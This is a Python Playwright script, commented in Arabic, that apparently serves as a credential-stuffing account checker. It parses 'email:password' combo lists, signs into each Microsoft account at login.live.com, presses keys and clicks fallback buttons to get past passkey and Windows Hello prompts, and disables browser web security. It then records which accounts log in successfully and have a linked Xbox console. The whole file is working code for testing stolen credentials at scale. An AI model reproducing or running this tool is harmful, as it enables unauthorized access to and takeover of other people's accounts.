import asyncio
from playwright.async_api import async_playwright
from typing import Dict, List, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 60000  # 60 ثانية

async def check_console(page) -> Tuple[bool, str, bool]:
    """التحقق من وجود جهاز Xbox بعد تسجيل الدخول"""
    try:
        await page.goto("https://www.xbox.com/en-US/play/consoles", timeout=30000)
        await page.wait_for_load_state("networkidle")
        text = (await page.inner_text('body')).lower()
        if "play your console remotely" in text:
            return True, "يوجد جهاز", True
        if "set up your console" in text:
            return False, "مسجل ولا يوجد جهاز", True
        if "sign in to finish setting up" in text:
            return False, "تسجيل غير مكتمل", False
    except Exception as e:
        print(f"خطأ في check_console: {e}")
    return False, "فشل التحقق", False

async def bypass_passkey(page):
    """محاولة قوية لتجاوز أي شاشة Passkey أو Windows Hello"""
    # الضغط على Esc, Enter, Space عدة مرات
    for key in ["Escape", "Enter", "Space", "Enter", "Tab"]:
        await page.keyboard.press(key)
        await asyncio.sleep(0.5)
    
    # انتظار قليل ثم البحث عن "Sign in another way"
    await asyncio.sleep(2)
    try:
        # البحث عن أي زر يحتوي على هذه النصوص
        selectors = [
            "button:has-text('Sign in another way')",
            "button:has-text('Other ways to sign in')",
            "a:has-text('Sign in another way')",
            "button:has-text('Use a password')",
            "button:has-text('Use your password')"
        ]
        for selector in selectors:
            if await page.locator(selector).count() > 0:
                await page.click(selector, timeout=3000)
                print(f"✅ تم النقر على {selector}")
                await asyncio.sleep(2)
                break
    except Exception as e:
        print(f"لم يتم العثور على زر بديل: {e}")

async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        # تشغيل Chromium مع تعطيل WebAuthn (Passkey)
        browser = await p.chromium.launch(
            headless=headless,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-features=WebAuthentication',
                '--disable-web-security',
                '--disable-features=PasswordImport'
            ]
        )
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )
        page = await context.new_page()

        # رابط يمنع طرق تسجيل الدخول البديلة ويجبر على كلمة المرور
        login_url = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&rver=7.0.0000.0&wp=MBI_SSL&wreply=https:%2F%2Fwww.xbox.com%2Fen-US%2Fplay%2Fconsoles&id=292540&prompt=login"
        await page.goto(login_url, timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle")

        # إدخال البريد الإلكتروني
        await page.fill("input[name='loginfmt']", account['email'])
        await asyncio.sleep(7)  # انتظار 7 ثوانٍ (كما تريد)

        # الضغط على زر "التالي"
        await page.click("input[type='submit']")
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(2)

        # **محاولة تجاوز أي شاشة Passkey أو شاشة عالقة**
        await bypass_passkey(page)

        # الآن نبحث عن حقل كلمة المرور
        try:
            await page.wait_for_selector("input[name='passwd']", timeout=15000)
            await page.fill("input[name='passwd']", account['password'])
            await asyncio.sleep(5)
        except:
            # إذا لم نجد حقل كلمة المرور، نحاول الضغط على "Use a password"
            try:
                await page.click("button:has-text('Use a password')", timeout=5000)
                await page.wait_for_selector("input[name='passwd']", timeout=10000)
                await page.fill("input[name='passwd']", account['password'])
                await asyncio.sleep(5)
            except Exception as e:
                raise Exception(f"فشل في العثور على حقل كلمة المرور: {e}")

        # الضغط على زر تسجيل الدخول
        await page.click("input[type='submit']")
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(2)

        # تجاوز شاشة "البقاء مسجلاً"
        try:
            if await page.locator("input[value='Yes']").count() > 0:
                await page.click("input[value='Yes']")
        except:
            pass

        # التحقق من وجود جهاز Xbox
        has_console, console_info, login_success = await check_console(page)
        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info

        await browser.close()
        await p.stop()
    except Exception as e:
        result['console_info'] = f"خطأ: {str(e)[:100]}"
        # في حالة الفشل، نلتقط صورة للصفحة لتحليلها (ستظهر في السجلات)
        try:
            if p and hasattr(page, 'screenshot'):
                screenshot = await page.screenshot()
                import base64
                b64 = base64.b64encode(screenshot).decode('utf-8')
                print(f"📸 Screenshot عند الفشل (base64): {b64[:200]}... (طول {len(b64)})")
        except:
            pass
        if p:
            await p.stop()
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts
